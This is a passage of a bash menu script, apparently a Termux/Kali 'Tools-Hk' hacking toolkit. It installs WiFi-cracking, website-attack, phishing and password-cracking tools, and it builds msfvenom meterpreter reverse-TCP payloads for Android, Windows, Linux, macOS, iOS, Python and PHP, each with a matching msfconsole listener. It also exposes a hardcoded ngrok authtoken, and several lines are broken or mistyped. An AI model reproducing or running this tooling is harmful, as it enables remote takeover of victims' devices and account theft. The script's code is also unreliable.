#apt install -y autoconf bison clang lcoreutils axel curl findutils git apr apr-util libffi-dev libgmp-dev libpcap-dev postgresql-dev read -p " insert : "line-dev libsqlite-dev openssl-dev libtool libxml2-dev libxslt-dev ncurses-dev pkg-config wget make ruby-dev libgrpc-dev termux-tools ncurses-utils ncurses unzip zip tar postgresql termux-elf-cleaner
meta

fi


if [ $ter_sniffing = 4 ]
then
clear
head
echo -e $green "BEeF"
echo ""
echo -e $yellow "Note : before any thing copy this code to your terminal dpkg --print-architecture"
echo ""
echo ""
echo -e $green '{ -1- } ===> ' $white " _aarch64/armv8/armv8l/arm64_"
echo ""
echo -e $green '{ -2- } ===> ' $green " _armhf/armv7l/arm/arm5vl_"
echo ""
echo -e $green "00- back"
echo ""
read -p " insert : " Bef
if [ $Bef = 1 ]
then
clear
apt update && apt upgrade -y
pkg install git -y
cd $Home
git clone https://github.com/profionaldhim/sources-list-termux
mv sources-list-termux/sources.list /data/data/com.termux/files/usr/etc/apt
#wget https://raw.githubusercontent.com/Hax4us/Hax4us.github.io/master/sources-aarch64.list.txt
#mv sources-aarch64.list.txt sources.list
#mv sources.list $PREFIX/etc/apt
#wget https://xeffyr.github.io/termux-x-repository/pubkey.gpg
apt update && apt upgrade -y
apt-get install gnupg gnupg2 -y
#apt-key add pubkey.gpg
apt-get install beef-xss -y
beef
fi
if [ $Bef = 2 ]
then
clear
apt update && apt upgrade -y
pkg install git -y
#wget https://raw.githubusercontent.com/Hax4us/Hax4us.github.io/master/sources-arm.list.txt
#mv sources-arm.list.txt sources.list
#mv sources.list $PREFIX/etc/apt
#wget https://xeffyr.github.io/termux-x-repository/pubkey.gpg

#apt update && apt upgrade -y
cd $Home
git clone https://github.com/profionaldhim/sources-list-termux
mv sources-list-termux/sources.list /data/data/com.termux/files/usr/etc/apt
apt-get install gnupg gnupg2 -y
#apt-key add pubkey.gpg
apt-get install beef-xss -y
beef
fi
if [ $Bef = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $ter_sniffing = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 3 ]
then
clear

head
echo -e $green "Wifi Hack"
echo ""
echo -e $green '{ -1- } ===> ' $white " Wifite"
echo ""
echo -e $green '{ -2- } ===> ' $green " wifite2"
echo ""
echo -e $green '{ -3- } ===> ' $white " HT-WPS-Breaker"
echo ""
echo -e $green '{ -4- } ===> ' $green " fluxion"
echo ""
echo -e $green '{ -5- } ===> ' $white " Routersploit"
echo ""
echo -e $green '{ -6- } ===> ' $green " airgeddon"
echo ""
echo -e $green '{ -7- } ===> ' $white "M-Info list password"
echo ""
echo -e $green "00- Back"
echo ""
read -p " insert : " wifi2
if [ $wifi2 = 1 ]
then
clear
echo -e $green
figlet "wifite"
cd ~
wget https://raw.github.com/derv82/wifite/master/wifite.py
bash Tools-Hk.sh
fi
if [ $wifi2 = 2 ]
then
clear
echo -e $green
figlet "wifite2"
cd ~
git clone https://github.com/derv82/wifite2.git
bash Tools-Hk.sh
fi
if [ $wifi2 = 3 ]
then
clear
echo -e $green
figlet "HT-WPS-Breaker"
cd ~
git clone https://github.com/SilentGhostX/HT-WPS-Breaker
bash Tools-Hk.shfi
fi
if [ $wifi2 = 4 ]
then
clear
echo -e $green
figlet "fluxion"
cd ~
git clone https://github.com/facebook/flux.git
bash Tools-Hk.sh
fi
if [ $wifi2 = 5 ]
then
clear
echo -e $green
figlet "RouterSploit"
cd ~
git clone https://github.com/reverse-shell/routersploit
bash Tools-Hk.sh
fi
if [ $wifi2 = 6 ]
then
clear
echo -e $green
figlet "airgeddon"
cd ~
git clone https://github.com/v1s1t0r1sh3r3/airgeddon
bash Tools-Hk.sh
fi
if [ $wifi2 = 7 ]
then
clear
echo -e $green
figlet "M-Info Word list"
pip install wordlist
fi
if [ $wifi2 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 4 ]
then
clear
head
echo -e $green "WebSite Hack"
echo ""
echo -e $green '{ -1- } ===> ' $white " Sqlmap"
echo ""
echo -e $green '{ -2- } ===> ' $green " webscan"
echo ""
echo -e $green '{ -3- } ===> ' $white " Xshell"
echo ""
echo -e $green '{ -4- } ===> ' $green " scriptux"
echo ""
echo -e $green '{ -5- } ===> ' $white " Sitebroker"
echo ""
echo -e $green '{ -6- } ===> ' $green " nmap"
echo ""
echo -e $green '{ -7- } ===> ' $white " Devploit"
echo ""
echo -e $green '{ -8- } ===> ' $green " Iplocator"
echo ""
echo -e $green '{ -9- } ===> ' $white " sniper-h"
echo ""
echo -e $green '{ -10- } ===> ' $green " hash-identifier"
echo ""
echo -e $green '{ -11- } ===> ' $white " dirsearch"
echo ""
echo -e $green '{ -12- } ===> ' $green " Google-Dork-Scan"
echo ""
echo -e $green '{ -13- } ===> ' $white " admin-panel-finder"
echo ""
echo -e $green '{ -14- } ===> ' $green " XSStrike"
echo ""
echo -e $green '{ -15- } ===> ' $white " XAttacker"
echo ""
echo -e $green '{ -16- } ===> ' $green " OWScan"
echo ""
echo -e $green "00- Back "
echo ""
read -p " insert : " ter_website
if [ $ter_website = 1 ]
then
clear
echo -e $green
figlet "Sqlmap"
cd ~
git clone https://github.com/sqlmapproject/sqlmap
bash Tools-Hk.sh
fi
if [ $ter_website = 2 ]
then
clear
echo -e $green
figlet "webscan"
cd ~
git clone https://github.com/kost/docker-webscan
bash Tools-Hk.sh
fi
if [ $ter_website = 3 ]
then
clear
echo -e $green
figlet "Xshell"
cd ~
git clone https://github.com/Ubaii/Xshell
bash Tools-Hk.sh
fi
if [ $ter_website = 4 ]
then
clear
echo -e $green
figlet "scriptux"
cd ~
git clone https://github.com/Gameye98/Scriptux
bash Tools-Hk.sh
fi
if [ $ter_website = 5 ]
then
clear
echo -e $green
figlet "sitebrokler"
cd ~
git clone https://github.com/Anon-Exploiter/SiteBroker
bash Tools-Hk.sh
fi
if [ $ter_website = 6 ]
then
clear
echo -e $green
figlet "nmap"
apt install nmap
bash Tools-Hk.sh
fi
if [ $ter_website = 7 ]
then
clear
echo -e $green
figlet "Devploit"
git clone https://github.com/joker25000/Devploit
bash Tools-Hk.sh
fi
if [ $yer_website = 8 ]
then
clear
echo -e $green
figlet "IPlocator"
cd ~
git clone https://github.com/AndreasBriese/ipLocator
bash Tools-Hk.sh
fi
if [ $ter_website = 9 ]
then
clear
echo -e $green
figlet "sniper-h"
git clone https://github.com/laser010/sniper-h
bash Tools-Hk.sh
fi
if [ $ter_website = 10 ]
then
clear
echo -e $green
figlet "hash-identifier"
git clone https://github.com/Miserlou/Hash-Identifier
bash Tools-Hk.sh
fi
if [ $ter_website = 11 ]
then
clear
echo -e $green
figlet "dirsearch"
cd ~
git clone https://github.com/maurosoria/dirsearch
bash Tools-Hk.sh
fi
if [ $ter_website = 12 ]
then
clear
echo -e $green
figlet "Google-Dork-Scan"
cd ~
git clone https://github.com/ReiGelado/Google-Dork-scan
bash Tools-Hk.sh
fi
if [ $ter_website = 13 ]
then
clear
echo -e $green
figlet "admin-panel-finder"
cd ~
git clone https://github.com/bdblackhat/admin-panel-finder
bash Tools-Hk.sh
fi
if [ $ter_website = 14 ]
then
clear
echo -e $green
figlet "XSStrike"
cd ~
git clone https://github.com/UltimateHackers/XSStrike
bash Tools-Hk.sh
fi
if [ $ter_website = 15 ]
then
clear
echo -e $green
figlet "XAttacker"
cd ~
git clone https://github.com/Moham3dRiahi/XAttacker
bash Tools-Hk.sh
fi
if [ $ter_website = 16 ]
then
clear
echo -e $green
figlet "OWScan"
cd ~
git clone https://github.com/Gameye98/OWScan
bash Tools-Hk.sh
fi
if [ $ter_website = 00 ]
then
clear
echo -e $green
figlet "back"
bash Tools-Hk.sh
fi
fi
if [ $termux = 5 ]
then
clear
head
echo -e $green "Account Hack"
echo ""
echo -e $green '{ -1- } ===> ' $white " hydra"
echo ""
echo -e $green '{ -2- } ===> ' $green " weeman"
echo ""
echo -e $green '{ -3- } ===> ' $white " crunch (wordlist)"
echo ""
echo -e $green '{ -4- } ===> ' $green " socialfish"
echo ""
echo -e $green '{ -5- } ===> ' $white " Hunner"
echo ""
echo -e $green "00- Back"
echo ""
read -p " insert : "  hackacc
if [ $hackacc = 1 ]
then
clear
echo -e $green
figlet "Hydra"
pkg install hydra
bash Tools-Hk.sh
fi
if [ $hackacc = 2 ]
then
clear
echo -e $green
figlet "weeman"
git clone https://github.com/evait-security/weeman.git
bash Tools-Hk.sh
fi
if [ $hackacc = 3 ]
then
clear
echo -e $green
figlet "crunch"
git clone https://github.com/KURO-CODE/Crunch-Cracker.git
bash Tools-Hk.sh
fi
if [ $hackacc = 4 ]
then
clear
echo -e $green
figlet "socialfish"
git clone https://github.com/UndeadSec/SocialFish
bash Tools-Hk.sh
fi
if [ $hackacc = 5 ]
then
clear
echo -e $green
figlet "Hunner"
git clone https://github.com/b3-v3r/Hunner.git
bash Tools-Hk.sh
fi
if [ $hackacc = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 6 ]
then
clear
head
echo -e $green "Backup / Recovery"
echo ""
echo -e $green '{ -1- } ===> ' $white " Backup"
echo ""
echo -e $green '{ -2- } ===> ' $green " Recovery"
echo ""
echo -e $green "00- Back"
echo ""
read -p " insert : " backup_recovery2
if [ $backup_recovery2 = 1 ]
then
clear
echo -e $green
figlet "backup"
cd ~
apt update && apt upgrade
termux-setup-storage
cd /data/data/com.termux/files
tar -cvzf /sdcard/buckup-termux.tgz home usr
bash Tools-Hk.sh
fi
if [ $backup_recovery2 = 2 ]
then
clear
echo -e $green
figlet "Recovery"
cd ~
apt update && apt upgrade
termux-setup-storage
cd /data/data/com.termux/files
tar -xvzf /sdcard/buckup-termux.tgz
bash Tools-Hk.sh
fi
if [ $backup_recovery2 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 7 ]
then
clear
head
echo -e $green   "PAYLOAD"
echo ""
echo -e $green '{ -1- } ===> ' $white " Tmux-Bunch"
echo ""
echo -e $green '{ -2- } ===> ' $green " PAYMAX"
echo ""
echo -e $green '{ -3- } ===> ' $white " txtool"
echo ""
echo -e $green "00- Back"
echo ""
read -p " insert : " payload
if [ $payload = 1 ]
then
clear
echo -e $green
figlet "Tmux-Bunch"
cd ~
git clone https://github.com/Hax4us/Tmux-Bunch
bash Tools-Hk.sh
fi
if [ $payload = 2 ]
then
clear
echo -e $green
figlet "PAYMAX"
cd ~
git clone https://github.com/Matrix07ksa/PAYMAX
bash Tools-Hk.sh
fi
if [ $payload = 3 ]
then
clear
echo -e $green
figlet "Txtool"
cd ~
git clone https://github.com/kuburan/txtool
bash Tools-Hk.sh
fi
if [ $payload = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $termux = 00 ]
then
clear
bash Tools-Hk.sh
fi
if [ $termux = 8 ]
then
clear
head
echo -e $green   "Other"
echo ""
echo -e $green '{ -1- } ===> ' $white " spammer-Grab"
echo ""
echo -e $green '{ -2- } ===> ' $green " Ngrok"
echo ""
echo -e $green '{ -3- } ===> ' $white " change style"
echo ""
echo -e $green '{ -4- } ===> ' $green " root - sudo"
echo ""
echo -e $green '{ -5- } ===> ' $white " kali Nethunter"
echo ""
echo -e $green "00- Back "
echo ""
read -p " insert : " other2
if [ $other2 = 1 ]
then
clear
echo -e $green 
figlet "spammer-Grab"
cd ~
cd $Home
git clone https://github.com/profionaldhim/Spammer-Grab
cd Spammer-Grab
mv Spammer-Grab.zip $HOME
cd $Home
rm -rif Spammer-Grab
unzip Spammer-Grab.zip
cd Spammer-Grab
chmod +x spammer.py start.sh install.sh
bash Tools-Hk.sh
fi
if [ $other2 = 2 ]
then
clear
echo -e $green
figlet "Ngrok"
cd $Home
mv Tools-Hk/ngrok-stable-linux-arm.zip $HOME
apt install unzip -y
unzip ngrok-stable-linux-arm.zip
rm -rif ngrok-stable-linux-arm.zip
cd ngrok-stable-linux-arm
chmod +x ngrok
./ngrok authtoken 7VJwGkCTTUubiGhgz6Gv6_5fMLganRSKj9ntdefnF5o

bash Tools-Hk.sh
fi
if [ $other2 = 3 ]
then
clear
echo -e $green
figlet "change stayle"
cd $HOME
apt install figlet -y
apt install toilet -y
gem install lolcat

mv Tools-Hk/bash.bashrc $PREFIX/etc
cd $PREFIX/etc

rm -rif $PREFIX/etc/motd
bash Tools-Hk.sh
fi
if [ $other2 = 4 ]
then
clear
echo -e $green
figlet "root - sudo"
cd ~
apt upgrade -y
pkg install git -y
pkg install ncurses-utils -y
git clone https://github.com/profionaldhim/Termux-Sudo
cd Termux-Sudo
ls
cat sudo > /data/data/com.termux/files/usr/bin/sudo
chmod 700 /data/data/com.termux/files/usr/bin/sudo
sudo
bash Tools-Hk.sh
fi
if [ $other2 = 5 ]
then
clear
head
echo -e $green   " install kali Nethunter"
echo ""
echo -e $green     '{ -1- } ===> ' $white " no root"
echo -e $green     '{ -2- } ===> ' $green " root"
echo ""
echo -e $green     "00- BACK"
echo ""
echo ""
read -p " insert : " nethunter
if [ $nethunter = 1 ]
then
clear
figlet "Nethunter"
echo ""
apt update && apt upgrade -y

cd $HOME

pkg install curl ruby -y

curl -LO https://raw.githubusercontent.com/Hax4us/Nethunter-In-Termux/master/kalinethunter

chmod +x kalinethunter

./kalinethunter

chmod +x finaltouchup.sh

mv finaltouchup.sh kali-armhf/root

startkali

bash finaltouchup.sh

apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6

apt update && apt upgrade -y
bash Tools-Hk.sh
fi
if [ $nethunter = 2 ]
then
clear
figlet "Nethunter"
echo ""
apt update && apt upgrade -y

cd $HOME
sudo su
pkg install curl ruby -y

curl -LO https://raw.githubusercontent.com/Hax4us/Nethunter-In-Termux/master/kalinethunter

chmod +x kalinethunter

./kalinethunter
cd /data/data/com.termux/files/home/.suroot
chmod +x finaltouchup.sh

mv finaltouchup.sh kali-armhf/root

startkali

bash finaltouchup.sh

apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6

apt update && apt upgrade -y
bash Tools-Hk.sh
fi
if [ $nethunter = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
if [ $other2 = 00 ]
then
clear
bash Tools-Hk.sh
fi
fi
fi
if [ $name = 3 ]
then
clear
head
echo -e $green   "TOOLS"
echo ""
echo -e $green '{ -1- } ===> ' $white " Kali Linux"
echo ""
echo -e $green '{ -2- } ===> ' $green " Termux / Gnuroot"
echo ""
echo ""
echo -e $green "00- back"
echo ""
read -p " insert : " usetools
if [ $usetools = 1 ]
then
clear
head
echo -e $green   "use automatic not command"
echo ""
echo -e $green '{ -1- } ===> ' $white " injection payloads"
echo ""
echo -e $green '{ -2- } ===> ' $green " Scan Ip"
echo ""
echo -e $green '{ -3- } ===> ' $white " account hack"
echo ""
echo -e $green '{ -4- } ===> ' $green " web hack"
echo ""
echo -e $green '{ -5- } ===> ' $white " Ddos attack"
echo ""
echo -e $green '{ -6- } ===> ' $green " scan port"
echo ""
echo -e $green '{ -7- } ===> ' $white " wifi"
echo ""
echo -e $green '{ -8- } ===> ' $white " Hack IP WebCam With Hydra"

echo ""
echo ""
echo -e $green "00- Back "
echo ""
read -p " insert : " kali
if [ $kali = 1 ]
then
clear
head
echo -e $green   "Injection payloads"
echo ""
echo -e $green '{ -1- } ===> ' $white " msfvenom"
echo ""
echo -e $green '{ -2- } ===> ' $green " venom"
echo ""
echo -e $green '{ -3- } ===> ' $white " PAYMAX"
echo ""
echo -e $green '{ -4- } ===> ' $green " CamPhish"
echo ""
echo -e $green "00- Back "
echo ""
read -p " insert : " injection_payload
if [ $injection_payload = 1 ]
then
clear
head
echo -e $green   "msfvenom"
echo ""

echo -e $green     '{ -1-  } ===> ' $white " Payload Android"
echo -e $green     '{ -2-  } ===> ' $green " Payload Windows"
echo -e $green     '{ -3-  } ===> ' $white " Payload Linux"
echo -e $green     '{ -4-  } ===> ' $green " Payload Mac"
echo -e $green     '{ -5-  } ===> ' $white " Payload Ios"
echo -e $green     '{ -6-  } ===> ' $green " Payload Python"
echo -e $green     '{ -7-  } ===> ' $white " Payload url"
echo -e $green     '{ -8-  } ===> ' $green " Payload mp4"
echo -e $green     '{ -9-  } ===> ' $white " Payload Pdf"
echo -e $green     '{ -10- } ===> ' $white " Embed Payload in Apk"
echo ""

echo -e $green     "00- BACK"
echo ""
echo ""
echo -e $green     "Enter The Number"
echo -e $green
read -p " insert : " pa
if [ $pa = 1 ]
then
clear
figlet "Payload Android"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is Name Payload? "
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is path seve "
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
toilet "Loading" | lolcat
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.apk
echo ""
echo -e $green "do you want start  metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " host
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 2 ]
then
clear
figlet "Make Payload Windows"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is Name Payload?"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green

read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is Path Save Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
read -p " insert : " pathsave
toilet "loading" | lolcat
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $Pathsave/$name.exe
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " host
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 3 ]
then
clear
figlet "Payload linux"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
toilet "Loading" | lolcat
msfvenom -f raw -p python/meterpreter/reverse_tcp -f elf LHOST=$lhost LPORT=$lport -o $pathsave/$name.py
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " host
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'

else
bash Tools-Hk.sh
fi
fi
if [ $pa = 4 ]
then
clear
figlet "Payload mac"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
echo ""
toilet "Loading" | lolcat
msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$lhost LPORT=$lport -o $pathsave/$name.macho
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " host
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " port
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 5 ]
then
clear
figlet "Payload ios"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~ ~_~_~_~_~_~_~_~_~'
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
echo -e $green
toilet "Loading" | lolcat
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.api
echo ""
echo -e $green "do you want start metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp' -x 'set LHOST '$lhost -x 'set LPORT '$lport -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 6 ]
then
clear
figlet "Payload python"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
read -p " insert : " lhost
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is Name Payload"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is pathsave"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
echo ""
toilet "Loading" | lolcat
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.py
echo ""
echo -e $green "do you want start  metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 7 ]
then
clear
figlet "Payload url"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is Name Payload? "
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " name
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
echo ""
echo -e $green "What is path seve "
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_~_~_~'
read -p " insert : " pathsave
echo ""
toilet "Loading" | lolcat
msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $pathsave/$name.php
echo ""
echo ""
echo -e $green "do you want start  metasploit? y/n"
echo -e $green
read -p " insert : " yes_no
if [ $yes_no = "y" ]
then
clear
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lhost
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LPORT"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo -e $green
read -p " insert : " lport
echo ""
toilet "START" | lolcat
msfconsole -x 'use exploit/multi/handler' -x 'set payload php/meterpreter/reverse_tcp' -x 'set lport '$lport -x 'set lhost '$lhost -x 'exploit'
else
bash Tools-Hk.sh
fi
fi
if [ $pa = 8 ]
then
clear
figlet "Payload mp4"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
echo ""
echo -e $green "What is LHOST"
echo ""
echo '~_~_~_~_~_~_~_~_~_~_~_~_'
read -p " insert : " lhost
echo ""
toilet "START" | lolcat

